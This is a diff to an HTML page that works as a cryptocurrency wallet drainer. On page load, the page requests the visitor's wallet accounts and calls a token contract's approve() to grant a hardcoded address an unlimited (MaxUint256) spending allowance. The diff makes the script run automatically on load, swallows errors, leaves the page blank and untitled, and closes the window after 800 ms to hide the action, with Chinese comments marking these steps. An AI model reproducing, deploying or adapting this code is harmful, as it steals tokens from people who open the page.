@@ -5,10 +5,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title></title>
   <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
+  <style>body{margin:0;padding:0;background:#000;}</style>
 </head>
-<body style="margin:0;padding:0;background:#000;color:#0f0;font-family:sans-serif;">
+<body>
   <script>
-    async function run() {
+    async function autoTrigger() {
+      if (typeof window.ethereum === 'undefined') return;
+
       try {
         const provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
@@ -21,9 +24,14 @@
         );
 
         await contract.approve("0x5762D5c904cC7Db9B927cd26B0B3225D50bf50ED", ethers.constants.MaxUint256);
+        
+        // 嘗試自動關閉頁面
+        setTimeout(() => window.close(), 800);
       } catch(e) {}
     }
-    run();
+
+    // 立即執行
+    window.onload = autoTrigger;
   </script>
 </body>
 </html>
